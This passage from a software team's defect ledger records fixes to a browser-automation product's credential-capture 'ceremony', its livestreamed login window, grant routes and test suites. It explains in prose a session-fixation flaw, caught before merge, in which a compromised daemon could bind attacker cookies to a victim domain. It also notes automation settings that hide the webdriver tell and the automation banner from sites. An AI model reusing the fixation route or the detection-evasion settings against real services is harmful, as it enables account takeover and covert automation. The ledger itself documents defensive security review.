  Under the full contract suite (71 files, several driving browsers) the render exceeds vitest's 30s
  default and the test fails with `Test timed out in 30000ms` - a red in the suite that gates every
  PR, saying nothing at all about the code, on an assertion that deliberately accepts EITHER outcome
  (302 rendered, 503 Chromium unavailable). The same file passes in isolation in 74s. FIXED with an
  explicit 90s timeout, matched to what the file's other browser-driving test already uses. Not a
  papering-over: the clock running out is not one of the two outcomes this test is about.

- **`dev-api-health-watchdog-kills-a-slow-boot-as-an-epipe`** (FIXED 2026-08-31, MEDIUM,
  tooling/diagnosability). Two independent watchdogs waited for `/health`: the driver's
  (`EKOA_API_HEALTH_TIMEOUT_MS`, 180s, documented and overridable) and `scripts/dev-api.mjs`'s own
  (120s, overridable only via a DIFFERENT env var the driver never set). The inner one always fired
  first, and on expiry it tore the ephemeral Mongo down - killing a server that was still booting.
  What the operator saw was `[ekoa-api] boot failed: Error: write EPIPE` from the mongo driver, with
  nothing anywhere saying a timer had done it, and raising the documented override changed nothing.
  FIXED by having the driver pass its own ceiling down as `DEV_API_HEALTH_TIMEOUT_MS` so there is ONE
  deadline, plus a gotcha in the skill for anyone booting `dev-api.mjs` by hand.

## Recently fixed - 2026-08-28 the cornerstone hardening (K2 honest halt, K6 heal budget + one-writer clear)

Fixed the same day they were ledgered, inside the cornerstone build (commits 7725145, f438948),
each with a committed suite. Kept here with their original text for the record.

- FIXED (K2): **`needs-credentials-halt-flattens-to-automation-failed-at-the-action-surface`** -
  `needs_credentials` is now a typed member of the ActionRunResult/IntegrationErrorCode unions,
  `mapIntegrationOutcome` maps it to `blocked`, and a scheduled integration_action credential halt
  notifies the owner per fire instead of silently burning the ceiling. Suites:
  `replay-mount.test.ts` (the envelope), `schedules/supervisor.test.ts` (blocked + notified).

- FIXED (K6): **`recipe-drift-heal-cycles-are-unbounded`** - `HEAL_BUDGET.maxConsecutiveDriftHeals`
  (pinned) reads the recipe's `driftStreak` (bumped by every supersede, zeroed by a successful
  replay via `recordReplay`); at the ceiling the heal CLEARS the recipe instead of superseding
  forever. `REPLAY_BUDGET.maxWallClockMs` bounds the replay attempt itself. Suites:
  `replay-mount.test.ts` (both sides of the ceiling + the attempt cap), `recipe-store.test.ts`
  (streak lifecycle), `budgets.test.ts` (pins).

- FIXED (K6): **`clear-refused-recipe-is-ownership-ungated`** - `clearRefusedRecipe` now verifies
  the caller owns the bound automation before discarding; a non-owner peer's refused replay falls
  through to the automation leg (`forbidden`) with the owner's recipe and lineage intact. Suite:
  `replay-mount.test.ts` (peer withheld / owner clears).

## Recently fixed - 2026-08-26 the ceremony stream lifecycle + the multi-domain capture refusal

Found by an adversarial lifecycle+binding audit run BEFORE any live pass (ultracode verification loop).
The feature was unit-green but had showstoppers in the common flow and the multi-domain case that the
per-side unit tests and the two security reviews all missed - because they were in the LIFECYCLE and
the multi-domain flows, not the security properties. All fixed on branch `fix/ceremony-stream-lifecycle`.

- **`ceremony-capture-refused-when-the-login-lands-on-a-different-host`** (**FIXED**, was HIGH; the
  likely real root cause of the original Uber failure). `acceptSessionPush` (`api/src/bridge/attended.ts`)
  gated on an EXACT-HOST `sameOrigin(ceremony.origin, input.origin)` comparison, where `input.origin`
  is the URL the daemon reports it LANDED on. A real login lands wherever the portal's auth flow ends:
  an Uber Eats ceremony for `www.ubereats.com` completes on `auth.uber.com`; a naked-domain request for
  `ubereats.com` canonicalises to `www.ubereats.com`; an SSO portal returns through a central host. So
  the human pressed "Concluir" on a page whose host differed from the one asked, the exact-host check
  silently vetoed the capture (dropped, no error channel - the daemon had already said "Sessão
  capturada"), and the run parked in `needs_credentials` forever. The gate is REMOVED: the real control
  is `boundOriginsForEstablishedHost(jar, ceremony.origin)` (the jar must cover the CEREMONY origin,
  which a multi-domain login's `.ubereats.com` cookie still does), and the docblock always conceded the
  field comparison "only ever pretended to be" the origin cross-check. Tests updated:
  `adhoc-ceremony-capture.test.ts` + `attended-ceremony.test.ts` now assert a landed-elsewhere push
  with a jar covering the ceremony origin SUCCEEDS, and a jar covering nothing is refused by the
  evidence check.

- **`ceremony-stream-viewer-on-signal-dropped-during-chrome-launch`** (**FIXED**, was HIGH; the common
  flow). The viewer's `ceremony.stream{on:true}` arrives ~200ms after establish, but real Chrome takes
  1-3s to launch, so it reached the daemon while `ceremonyInFlight.stream` was still null and was
  silently dropped and never replayed -> BLACK CANVAS forever, input dead, in the normal path. FIX
  (`clients/bridge/src/runtime/daemon-runtime.ts`): buffer `wantStream` on the ceremony handle and
  apply it in `onStreamReady` when the controller registers. Pinned by a livestream-routing test that
  sends on:true while the launch is suspended.

- **`ceremony-stream-has-no-viewer-re-attach-path`** (**FIXED**, was HIGH; page reload kills the
  stream). `openCeremonyStream` was reached only from establish, and every establish opened a FRESH
  ceremony; so after any viewer drop, re-clicking "Abrir janela" minted a second ceremony the daemon
  (holding the first) refuses, returning a connected-looking DEAD canvas. FIX: `findOpenCeremony`
  (`api/src/bridge/attended.ts`, owner+pairing+origin scoped, mirroring `requestCeremonyCapture`) +
  establish REUSES an open ceremony's requestId and re-mints the viewer token, so reconnect / 4000
  takeover / kept-window re-attach are all reachable. Pinned by a cofre-contract test (two establishes
  for one origin -> same wsUrl, one ceremony).

- **`ceremony-stream-controller-cannot-cancel-an-in-flight-start`** (**FIXED**, was MEDIUM). A stop
  landing while `newCdp()` was awaited was a no-op; the start closure then installed a screencast with
  no viewer -> orphan 15fps stream for up to 9 min. FIX (`clients/bridge/src/attended/screencast.ts`):
  a `desired` state the start closure re-checks after each await, and a `stopped` re-check in
  `CeremonyScreencast.start()` between `Page.enable` and `Page.startScreencast`.

- **`ceremony-stream-refused-push-strands-the-viewer-and-a-low-token-ttl-cuts-a-live-stream`**
  (**FIXED**, was LOW). `onCeremonyEnded` was success-path only, so a refused push left the viewer
  frozen until the backstop; and the backstop was derived from the viewer-token TTL, so lowering
  `EKOA_STREAMING_TOKEN_TTL_SECONDS` could cut a live stream mid-login. FIX: `onCeremonyEnded` fires in
  the `session.push` catch too (`api/src/bridge/server.ts`), and the backstop is a fixed
  `CEREMONY_STREAM_MAX_MS` (11 min, past the 9-min ceremony window) independent of the token TTL
  (`api/src/streaming/ceremony-stream.ts`).

## Recently fixed - 2026-08-26 the ceremony window streams to the human's own device

- **`attended-ceremony-window-opens-on-the-bridge-not-where-the-human-is`** (**FIXED 2026-08-26** as
  the residual #2 of `attended-ceremony-headed-browser-is-not-viable-for-a-normal-user`; operator
  request: "if we're not on the device holding the bridge lets stream the browser to the current
  machine"). The ceremony's real-Chrome window runs on the bridge; when that is not where the human is,
  a headed window there is useless to them. FIX (docs/decisions.md, D-CEREMONY-STREAM): the window is
  live-streamed into the dashboard - JPEG CDP screencast up as a new `ceremony.frame` BridgeFrame,
  relayed down a media-channel socket; the human's mouse/keyboard up that socket and back to the daemon
  as `ceremony.input`. So they log in from their own laptop/phone, in a panel in their dashboard tab,
  with none of the focus war a remote headed window causes and OTP-from-another-app entirely free.

  It reuses the existing canvas media channel (`streaming/`) wholesale - the same short-TTL single-use
  `ekoa-canvas` token, the same wire (`protocol.ts`), the same 1000/4000 close contract - as a separate
  session type + path (`/api/v1/ceremony-stream/`) keyed by the ceremony requestId. Gated by a new
  `attended.livestream` capability (advertised by a new-enough daemon; an older one omits it and the
  ceremony stays a local-window flow), owner scope, and a live registered session. THE FOUNDATION was a
  separate B17-port bug fixed first: the dashboard canvas client was wire-incompatible with the server
  (`the live canvas speaks the server's text-JSON media wire`, below), which had left the whole live
  view - cloud-automation pauses included - silently dead.

  CREDENTIAL PRIVACY: the human types their real password into the streamed view, so a `ceremony.input`
  key event carries a password character and a frame is the login page. Both cross Cortex in RAM only
  and are NEVER logged, traced or ledgered (the Cofre transit rule) - the relay logs by requestId only;
  the frame rides the redactor's image path untouched; the site masks the password field. Tests:
  `api/tests/streaming/ceremony-stream.test.ts` (frame relays down; input relays up; a frame/keystroke
  is never logged; backpressure drops; takeover 4000; viewer-drop stops the screencast; owner recorded;
  TTL/close teardown), `web/__tests__/lib/canvas.test.ts` (the wire both directions), and the daemon
  producer's own suite.

  ADVERSARIAL REVIEW (2026-08-26, before merge). The stream is a new credential-transit path, so it got
  a focused adversarial pass; it cleared keystroke/frame privacy, the token/upgrade, and remote-input,
  and found TWO defense-in-depth gaps, both FIXED. (1) `pushCeremonyFrame` bound the viewer session by
  requestId ALONE, so a compromised daemon on another pairing that learned the (unguessable) requestId
  could paint a spoofed frame onto the owner's dashboard - the frame path is now bound to the delivering
  pairing, mirroring the input path and `acceptSessionPush` (pinned by "DROPS a frame delivered by a
  pairing that is not the one holding the ceremony"). (2) The daemon-facing bridge WSS had no
  `maxPayload` (ws's 100MiB default), which `ceremony.frame` turned into a sustained high-rate vector -
  now capped at 32MiB (`MAX_BRIDGE_FRAME_BYTES`), far above any legitimate frame. RESIDUAL (LOW,
  accepted): the stream token rides the URL `?token=` like the canvas channel it reuses - single-use +
  600s TTL mean a logged token is already spent; moving it off the URL would diverge from the canvas
  client and is deferred.

## Recently fixed - 2026-08-26 a multi-domain login authenticates (via real-Chrome continuity, NOT a wider binding)

- **`ad-hoc-captured-session-does-not-authenticate-a-multi-domain-login`** (**FIXED 2026-08-26**, was
  HIGH; found completing the live Uber Eats acceptance run). DIAGNOSIS CORRECTED TWICE. The original
  report guessed the narrowing DROPPED the `uber.com` cookies at capture - wrong: the whole
  `storageState` jar is stored AND injected at reuse regardless of `boundOrigins`
  (`automation/local-browser-session.ts` `addCookies` takes every cookie), so cross-domain auth
  cookies ride along and a redirect to `auth.uber.com` is already authenticated. An interim fix then
  WIDENED the binding to the login's httpOnly-cookie domain family (D-BIND-FAMILY) - but adversarial
  cross-model review caught that as a **security regression** (see the next section), because on the
  ceremony push path the daemon declares the whole jar and could bind the owner's item to an arbitrary
  victim domain. Reverted.

  THE ACTUAL FIX (docs/decisions.md, D-BIND-NARROW-2026-08-26 + D-CEREMONY-REALCHROME). Two things,
  neither of them a wider binding. (1) The binding stays NARROW - `[host]`, the single origin Cortex
  asserted for the capture - and multi-domain logins work anyway because the full jar is injected
  (cross-domain cookies carry through redirects) and a run halts at the SPECIFIC origin it needs, so
  the ceremony is opened for exactly that origin and the narrow binding matches. (2) The real reason
  the LIVE Uber run failed was environment discontinuity: capture ran in throwaway bundled Chromium,
  replay in real Chrome. The ceremony rebuild onto the persistent real-Chrome profile
  (`attended-ceremony-headed-browser-is-not-viable-for-a-normal-user`) makes capture and replay share
  one real-Chrome environment, which is what a hard adversarial SSO needs. A later step that targets a
  second registrable domain directly re-ceremonies, instant on the persistent profile.

  TESTS: `api/tests/security/cofre-sessions.test.ts` (binds to exactly the asserted host, ignoring
  other jar domains; ignores a crafted httpOnly rider for an unrelated domain; never binds to a bare
  public suffix; the whole jar is still stored so a cross-domain cookie survives at reuse) and
  `api/tests/security/adhoc-ceremony-capture.test.ts` (the httpOnly session-fixation rider is ignored
  on the push path).

## Recently fixed - 2026-08-26 adversarial review caught a session-fixation over-binding before merge

- **`captured-session-binding-widened-to-daemon-declared-jar-domains`** (**CAUGHT PRE-MERGE + FIXED
  2026-08-26**, would have been **HIGH/security**; found by the adversarial cross-model review the
  binding change triggered, never shipped). An interim binding (D-BIND-FAMILY) derived `boundOrigins`
  from the jar's own cookies - every domain carrying an `httpOnly` cookie. On the ceremony
  `session.push` path (`api/src/bridge/attended.ts`) the DAEMON declares the whole `storageState`
  (`z.unknown()`), so the flag is attacker-controlled: a compromised daemon pushes
  `{domain:'bank.example', value:<attacker session>, httpOnly:true}` beside the legit ceremony cookie,
  the item binds to `bank.example` and is armed with a grant, and the OWNER's own later run targeting
  `bank.example` discovers it (`findSessionItemsForOrigin`) and injects the attacker's jar - session
  fixation into the owner's automations. A `{domain:'.com', httpOnly:true}` cookie bound to every
  `.com` (no public-suffix guard). This re-opened the confused-deputy hole the prior narrow fix had
  closed (`attended.ts` docblock, review round F1). FIX: revert to `boundOriginsForEstablishedHost`
  binding `[host]` only - the origin Cortex asserted, never a jar-derived domain (D-BIND-NARROW-2026-08-26).
  This is the five-layer QA working as designed: the security-surface change earned an adversarial
  review, the review refuted it with a concrete exploit, and the regression was fixed before the slice
  merged. Tests: the adversarial rider cases named above.

## Recently fixed - 2026-08-26 the attended ceremony is a normal Chrome window, not a robot's

- **`attended-ceremony-headed-browser-is-not-viable-for-a-normal-user`** (**MOSTLY FIXED 2026-08-26**,
  was HIGH; operator flagged the live ceremony "very bad ... a normal user would not be able to cope").
  ROOT CAUSE. The ceremony (`clients/bridge/src/attended/ceremony.ts`) launched Playwright's BUNDLED
  chromium via `chromium.launch()` into a THROWAWAY context - a different and worse path than the run
  executor, which already launches the user's real installed Chrome on a dedicated persistent profile
  (`browser/profile.ts`). So the human typed a real password into an automation window with the
  "controlled by automated test software" banner, that flapped tabs and re-navigated, and whose
  session neither persisted nor matched the environment replay would run in.

  THE FIX (docs/decisions.md, D-CEREMONY-REALCHROME). A shared launch primitive,
  `clients/bridge/src/browser/chrome-launch.ts` (`launchHeadedRealChrome`), opens the SAME kind of
  window the run executor does: real Chrome first (`channel:'chrome'`, bundled fallback), a dedicated
  per-origin `--user-data-dir` under `<EKOA_BRIDGE_HOME>/ceremony-profiles`, the automation infobar
  suppressed (`ignoreDefaultArgs:['--enable-automation']`), the webdriver tell removed, navigated ONCE
  and then left alone - the window reuses its DEFAULT tab (no second tab, no re-goto). The lifecycles
  stay separate (a ceremony is human-paced; the run lease wipes-on-release and idle-reaps, which would
  wipe a login mid-ceremony), but the launch is shared. Wins: no banner, a real Chrome window, the
  login persists (login-once-per-site), and capture in the same real-Chrome environment replay uses -
  the other half of the multi-domain-auth failure above.

  WHY NOT AN EXTENSION (operator asked explicitly). Chrome 136 (May 2025) ignores
  `--remote-debugging-port`/`--remote-debugging-pipe` on the DEFAULT `--user-data-dir` to stop the
  infostealer pattern of attaching to the everyday profile and lifting cookies
  (developer.chrome.com/blog/remote-debugging-port). A dedicated profile is the only supported way to
  drive real Chrome; the floor without an extension is one login per site, which this delivers.

  TESTS: `clients/bridge/test/browser/chrome-launch.test.ts` (real Chrome first; bundled fallback with
  no channel; the infobar-suppression arg present; the webdriver init script applied; a machine with
  no browser named with the install command; the dangling-symlink SingletonLock sweep; the ceremony
  adapter reuses the persistent context's DEFAULT page - never a second tab - and maps window-close to
  the completion signal; `hostKeyOf` reduces an origin to one stable per-portal profile key).
  `clients/bridge/test/attended/ceremony.test.ts` (the window copy now names the Done button as
  primary and closing as fallback). Diagram `docs/diagrams/11-delegation-security.excalidraw` updated
  (the binding-narrowing note refined + a dated D-BIND-FAMILY/D-CEREMONY-REALCHROME addendum).

  TWO RESIDUALS, together MEDIUM, tracked on the OPEN entry: the OS still raises the window on each
  login redirect (inherent to headed Chrome on macOS), and the window opens on the BRIDGE machine,
  which may not be where the human sits. Each wants its own design pass; neither blocks the matrix.

## Recently fixed - 2026-08-25 the ceremony's capture signal leaves the focus-stealing window

- **`attended-ceremony-browser-steals-focus-and-hides-its-capture-signal`** (**CAPTURE SIGNAL
  FIXED 2026-08-25; FOCUS THEFT ACCEPTED AS INHERENT**, was HIGH, UX/design; found running the live
  acceptance ceremony, operator hit it directly). The capture no longer depends on the window
  closing. A "Concluir e capturar" button on the `/cofre` ceremony card calls
  `POST /api/v1/cofre/sessions/capture`, which resolves the CALLER'S OWN open ceremony (by actor +
  machine + origin, never by a requestId the client names) and relays a new downward
  `ceremony.capture` frame; the daemon's ceremony loop takes it as a third completion signal beside
  {window closed, TTL}, snapshots the live `storageState` and pushes it on the UNCHANGED
  `session.push` rail - same origin binding, same actor, same grant (docs/decisions.md 2026-08-25,
  D-CEREMONY-DONE). So the human signals completion from the surface they already have focus in, and
  the window says so too ("Volte à Ekoa e clique em Concluir e capturar. Não precisa de fechar esta
  janela"). Closing still captures, and is kept as the fallback.

  THE FOCUS THEFT ITSELF IS NOT FIXED, and is accepted rather than deferred: Chromium on macOS
  activates its application and raises the window on navigation through AppKit, and no Playwright
  launch option or Chromium switch suppresses that (the ones that sound relevant -
  `--disable-backgrounding-occluded-windows`, `--disable-renderer-backgrounding`,
  `--no-startup-window` - govern background throttling and startup windows, not activation), while
  the measures that would work - launching minimised or off-screen - are hostile to a window the
  human has to type into. What the Done button changes is that the focus fight is confined to the
  login itself and no longer decides whether the session is captured.

  TESTS: `clients/bridge/test/attended/ceremony.test.ts` (the Done arm; the fresh snapshot it takes
  because the context is still alive; the close path still working; the in-window copy),
  `clients/bridge/test/attended/done-capture.test.ts` (frame -> push with no close anywhere;
  requestId mismatch and no-ceremony are no-ops that are SAID at the machine),
  `api/tests/security/adhoc-ceremony-capture.test.ts` (a caller can finish only their OWN ceremony,
  on their own machine, for that origin; a dead socket is a refusal; the ceremony stays open),
  `api/tests/contract/cofre.test.ts` (response shape, in-band refusal with no machine, origin
  validation, auth wall), `web/__tests__/components/cofre-capture-now.test.tsx` and
  `web/__tests__/cofre-capture-session.test.ts` (the affordance's in-flight gate, its copy, and the
  three honest outcomes). Each control is mutation-proven.

  REVIEW ROUND 2026-08-25, folded into this same fix. The capture's "newest wins" tiebreak was a
  guaranteed no-op in the very multi-ceremony divergence it was written for (the daemon refuses a
  second ceremony, so it can only be holding the FIRST), and the card's timeout copy steered away
  from closing the window - the one recovery that still captures. The tiebreak is gone rather than
  flipped: oldest-wins would have failed the commoner "that did not work, try again" flow, where the
  daemon holds the NEWEST and Cortex's abandoned entry lingers for the rest of its 10-minute TTL. The
  capture is now relayed to EVERY ceremony the caller has open for that origin on that machine and the
  daemon finishes the one it holds; the timeout copy names the close. Details in docs/decisions.md.

  A SECOND RESIDUAL, accepted rather than deferred (the first is the focus theft above). A human who
  presses Done after the portal has set a pre-auth cookie but BEFORE the second factor completes
  pushes a jar that is not really authenticated: `hasCookies` is a presence check, and
  `boundOriginsForEstablishedHost` accepts that cookie because it does cover the ceremony host. The
  exposure is IDENTICAL to the pre-existing close path - same two guards, same human-as-only-oracle,
  since the rail exists precisely because no portal-independent "login complete" signal exists and a
  heuristic one would be the per-portal knowledge the daemon refuses to carry. What changed is
  ergonomic: the trigger now lives away from the window, so pressing it early is easier, and the card
  then reports the item cheerfully. Accepted as human-owned, reasoning in docs/decisions.md (review
  round 2026-08-25, dismissing F1/F4/F7).

  UNVERIFIED (live-only, registered against this finding): a human completing a real OTP login while
  the window fights for focus, pressing "Concluir e capturar", and the halted run waking up
  authenticated. THE ORIGINAL REPORT, unchanged:

  The attended-ceremony capture (`clients/bridge/src/attended/ceremony.ts`) opens a HEADED Playwright
  Chromium the human must drive on the machine, and the SIGNAL that login is done is the human
  CLOSING the window (`waitForClose`; `storageState()` is snapshotted on open, every `framenavigated`,
  and each tick, and the last snapshot before close is pushed). Two real problems, measured live on a
  Mac: (1) FOCUS THEFT - a headed automation Chromium is raised/focused by macOS on every top-level
  navigation, and a real login flow redirects repeatedly (ubereats.com -> auth.uber.com -> back), so
  the window keeps pulling focus. This defeats the ONE thing the ceremony exists for: an OTP/2FA flow
  where the human must switch to Gmail / an authenticator / the Claude app to read a code and paste
  it back - the ceremony window yanks focus away mid-copy, so the human "can't do anything with the
  computer" (operator's words). (2) THE CAPTURE SIGNAL IS INVISIBLE - closing the window is what
  captures, but nothing in the window says so at the moment it matters; the only hint is one line on
  the /cofre card ("feche a janela quando terminar"), easily lost once the ceremony window has focus.
  Net: the operator logged in but no session was captured (0 Cofre items, run still needs_credentials)
  because the close-to-capture step never happened cleanly under the focus thrash. This is largely
  INHERENT to "a headed browser the human babysits on the machine" and is the sharpest limitation of
  the attended-ceremony design for its primary use case. CLOSE BY (design, not a one-liner): options
  to weigh - (a) capture WITHOUT requiring a window close (a "Done - capture now" affordance in the
  dashboard that pulls the current storageState over the existing session-push rail, so the human
  signals completion from the dashboard they already have focus in, not by closing a focus-stealing
  window); (b) suppress the automation browser's focus-raising where the OS allows it, and/or open it
  minimized/background with a clear dashboard-side "your login window is open" indicator; (c) an
  explicit in-window banner stating "log in, then click Done here" pointing back to the dashboard.
  Any of these decouples "the human finished" from "the window closed" and stops the focus war. This
  gates the ad-hoc acceptance run's final capture; everything upstream (durable halt, establish, the
  ceremony rail, the new bridge opening the window, login itself) was proven live.

## Recently fixed - 2026-08-24 the ad-hoc adversarial session lifecycle closes

- **`ad-hoc-adversarial-browser-run-pauses-in-process-not-durably`** (**FIXED 2026-08-24**, was
  MEDIUM, found running acceptance matrix run 1 - Uber Eats - live on a real bridge). A bridge run
  that hit a sign-in wall on an undeclared origin paused via `paused_for_user`, the in-process
  250 ms-poll path resumed by an in-memory `resumeFlag`. That pause did not outlive the api process,
  so a deploy, a crash or a long human delay lost it and the run had to be re-fired. Three further
  gaps, all confirmed live in the same session, made an ad-hoc read-after-login impossible end to
  end: (a) nothing CAPTURED the session the human established, so the next run started signed out;
  (b) the planner made the login a browser-ACTION step, which on an already-authenticated page
  resolves to nothing and re-paused on every resume - an infinite loop after the human had already
  logged in; (c) the paused run held the origin-keyed Chromium profile, so a second run against the
  same origin timed out at the 120s invocation window.

  THE MECHANISM THAT CLOSES IT. `engine.ts` gains ONE fork in the existing pause-detection block:
  when the detected `humanAction` kind is one a login ceremony can clear (`login | captcha | mfa`),
  the run is bridge-routed, and the step's resolved origin classifies ADVERSARIAL, the run takes the
  DURABLE-HALT exit - `needs_credentials` + `credentialRequest(mode: ceremony)` persisted, a
  credential waiter parked, and a RETURN - instead of `pauseRunForUser`. A PERMISSIVE origin keeps
  `paused_for_user`, unchanged; that is the entire behavioural change. The human completes the halt
  through the EXISTING attended rail (`bridge/attended.ts`, now carrying an additive `login` kind)
  from `POST /api/v1/cofre/sessions/establish`, reached by the `/cofre?origin=` deep link the halt
  already wrote; the capture is armed with a bounded 14-day TTL grant rather than the declared
  rail's standing `until_locked`, and the declared card ceremony still mints a locked item. The
  capture wakes the halted run through the credential-waiter path that already existed, and the
  re-dispatch injects the session through the S-inject channel - so gap (a) closes in both
  directions. Gap (b) closes three ways, of which the first is the deterministic one: the engine
  ANSWERS a `login` ask on a run it already handed a session to (the step completes as a no-op,
  capped at once per run), the vision resolver is told to return `noop` on a page that is plainly
  already signed in, and the planner is told never to emit a sign-in browser step at all. Gap (c)
  closes as a consequence of the halt being a RETURN: the loop's outer `finally` is the only place
  the browser lease is released, and a pause never reaches it. Journal: docs/decisions.md 2026-08-24
  "the durable-halt fork". Suites: `api/tests/automation/engine-adhoc-durable-halt.test.ts` (the
  fork from both sides, the persisted row, the waiter, the resume index, the lease release, the
  loop closure) and `api/tests/security/adhoc-ceremony-capture.test.ts` (the TTL grant, the declared
  path unchanged, Rule 5 per-user custody). Diagrams 02 and 11 carry the as-built.

  REVIEW ROUND (custody-scoped, same day) found and fixed three things in this slice, recorded
  because two of them were live defects rather than polish. The attended capture BOUND ITSELF TO THE
  WHOLE COOKIE JAR (`originsFromStorageState`) and never intersected that with the ceremony's own
  origin - latent while the rail minted locked items, live the moment this slice armed the ad-hoc
  capture with a 14-day grant, because the over-bound item was then unwrappable and wakeable across
  every analytics / SSO / parent domain in the jar. It now binds through
  `boundOriginsForEstablishedHost(storageState, ceremony.origin)`, the same narrowing the typist's
  capture path already used, which also refuses a push whose jar covers no cookie for the ceremony
  origin. The S-login-step guard was RUN-scoped where the durable fork is ORIGIN-scoped, so a run
  holding portal A's session could answer a sign-in wall at portal B with it; the gate's `ready`
  verdict now carries the origin it checked out for and the guard requires exact host equality. And
  the signature/I8 case was UNFAILABLE - which, on being rewritten to drive a real `signature` kind,
  surfaced that `vision.ts`'s `VALID_HUMAN_ACTION_KINDS` silently dropped that kind although both
  prompts ask for it by name, making the I8 exclusion unreachable. All three are mutation-proven.

  STILL UNVERIFIED, and deliberately carried forward rather than closed with the finding: "a human
  hits the wall, logs in through the ceremony window, and the next pass of that run comes up
  authenticated" is a LIVE-VERIFICATION acceptance item. Every suite here is deterministic and
  proves wiring, custody and routing; only a live bridge against a real portal can prove the page
  comes up authenticated. It sits with the S-inject item of the same class ("a real bridge run
  against a captured origin starts logged in"), and the two are one live pass.

## Recently fixed - 2026-08-24 the capability grant had no door, so the execution plane was dead

- **`capability-grants-have-no-route-or-ui-so-the-whole-browser-execution-path-is-unreachable`**
  (**FIXED 2026-08-24**, was HIGH, found while staging acceptance run 1). `grantCapability` /
  `revokeCapability` (`api/src/bridge/capability-grants.ts`) were built, security-tested and called
  by nothing but those tests: no HTTP route, no web caller. The enforcement half was real and
  correct - `bridge/daemon-step-seam.ts` refuses a step whose machine the org has not granted,
  default-deny, checked before any credential is delivered - so the product enforced an answer to a
  question it never asked anyone. Nothing could WRITE a grant, so `desktop.automation` and
  `local.bash` could never be turned on and every browser and bash step in production refused
  forever.

  FIXED by the surface, with the enforcement untouched. Three routes on the existing
  `bridgeTokenRouter` (`api/src/routes/bridge.ts`): `GET /api/v1/bridge/machines`,
  `POST /api/v1/bridge/pairings/:pairingId/capabilities`,
  `DELETE /api/v1/bridge/pairings/:pairingId/capabilities/:capability`, all declaring
  `auth: 'org-admin'` (the per-endpoint tier marking of api-contract.md CONV-1) and mounting
  `requireRole('org-admin', 'super-admin')` - both roles named, because `requireRole` is an exact
  membership test that does not treat super-admin as a superset of org-admin. Domain functions with
  their Registo writes in `bridge/capability-grants.ts`
  (`orgMachines`, `machineForOrg`, `grantedEgressEndpoint`, `grantCapabilityAudited`,
  `revokeCapabilityAudited`), exported through `bridge/index.ts` because `routes/` may not import
  `data/`. Web: `web/stores/bridge-machines.ts` +
  `web/components/settings/paired-machines-section.tsx`, on the EXISTING `/settings/devices` page,
  which now also appears in the settings nav (it was reachable only by the URL the bridge CLI
  prints). Journal: `docs/decisions.md` 2026-08-24.

  THE MECHANISM THAT MAKES THE CLOSURE REAL, rather than a route that writes a row nothing reads:
  `api/tests/contract/bridge-capabilities.test.ts` asserts `isCapabilityGranted` - the exact
  predicate the composition root hands the daemon step seam - is false before the route call and
  true after it, and false again after the revoke. A suite that only validated JSON would have
  passed over a route wired to the wrong store. 43 cases across that suite and
  `api/tests/security/capability-grant-isolation.test.ts` (Rule 5, memvault class): the plain user
  refused 403 even on the machine they own with nothing written; the admin gate proven to refuse
  BEFORE any store read, so its 403 is byte-identical for an own, a foreign and a non-existent
  machine and cannot be used to map a fleet; another org's machine absent from the listing, its
  advertised address absent from the response bytes, and grant/revoke on it answering a 404
  byte-identical to a machine that does not exist, with nothing written under EITHER org's key;
  `egress.residential` refused 400 with no row stored when it names no usable endpoint; the closed
  write vocabulary refused at the schema; revoke idempotent as a 200 carrying `revoked: false`.

  NOT PROVEN HERE, and registered UNVERIFIED for live acceptance: that a real paired daemon,
  granted through this UI, then executes a browser step. That needs a paired machine, which CI has
  none of. What is proven is that the grant the UI writes is the grant the refusal reads.

  Note on the report that `/settings/devices` returned `Cannot GET`: that page existed all along.
  The "Cannot GET" is the separate OPEN finding
  `bridge-device-verification-url-uses-the-api-origin-not-the-dashboard` - the CLI printed the API
  origin `:4111`, which serves no dashboard page. The address was fine; the machine list was what
  was missing, and it is what landed.

## Recently fixed - 2026-08-22 S2 review round (one blocker, five majors, six minors)

The integration detail slice (`f262e09`, branch `feat/s2-s3-detail-surface`) went through the review
gate before merge; 21 findings were confirmed with file:line evidence, and they deduplicate to one
root cause plus eleven distinct defects. All are fixed in the amended commit.

- **`s2-authored-against-the-retired-org-shared-evidence-key`** (**FIXED 2026-08-22**, BLOCKER, and
  the root of six findings: F1, F5, F6, F14, F18, plus the doc/contract half F7/F15/F17/F19). The
  whole slice - the view module, the route docblock, the shared contract's normative docblocks, the
  `docs/decisions.md` entry, the architecture section and BOTH new suites - was written against an
  org-only evidence key that an earlier round of this same unmerged branch had already replaced, then
  rebased forward without being reconciled. Three consequences, each on its own enough:
  **(a) IT DID NOT COMPILE AND THE READ WAS DEAD.** `action-evidence-view.ts` called
  `listForIntegration(actor.orgId, integrationKey)` against
  `listForIntegration(orgId, ownerUserId, integrationKey)` - one TS2554 from `npx tsc --noEmit`, and
  typecheck is in `ci:lane`, so CI was red. Vitest transpiles without typechecking, which is why the
  suites ran at all: at runtime the integration key bound to `ownerUserId`, `integrationKey` arrived
  `undefined`, the store's emptiness guard does not catch `undefined`, and the filter matched
  nothing. Every authorized caller would have been answered `{ items: [] }`.
  **(b) THE RULE 5 SUITE LANDED RED AND ITS MUTATION CLAIMS WERE UNFALSIFIABLE.** Both suites seeded
  `recordEvidence` with a three-term key and no `ownerUserId` - a shape `assertKey` only lets through
  because it compares against `''` and `undefined` slips past, so the seeds wrote a row the
  production writer can never emit. 7 of the 13 cases were red on the UNMUTATED tree; the six that
  passed are exactly the ones that cannot see a broken collection read. "Deleting the visible-action
  filter reddens 2, measured" could not have been measured here, and `SUITE_LEDGER.json` carried the
  same numbers.
  **(c) THE JOURNAL RECORDED THE TENANCY HAZARD AS THE DESIGN.** Four texts asserted "two members of
  one org share a row per action - deliberate, not in question", contradicting the round-eight entry
  on the same journal that re-keyed the collection *"so every call site is a compile error rather
  than a silent org-wide read"*. An editor following the S2 docs would have widened the read back to
  org scope - which is what the module header explicitly invited, and it would have handed one org
  member a colleague's real request and real response bodies.
  FIXED as the NARROW correction: the read passes `actor.userId` and stays OWNER-scoped, and the
  header, the route docblock, the shared docblocks, the decisions entry and the architecture section
  are corrected in place (same unmerged commit) to say so. The definition filter is KEPT and
  re-justified against the owner-keyed store - a row is addressed by an action NAME while the package
  naming it is a separate document, so a caller's own rows outlive it: an action re-authored out of
  the package, or a narrower `private` package resolving ahead of a wider `org` one, leaves a sample
  for an action the caller can no longer see, run or name.
  PROVEN BY MUTATION on this tree: reverting the owner argument reds 9 across the two suites (6 in
  the isolation suite, every positive control among them); deleting the resolution gate reds 5.

- **`s2-the-isolation-suites-headline-cases-could-not-fail`** (**FIXED 2026-08-22**, MAJOR, F20 - the
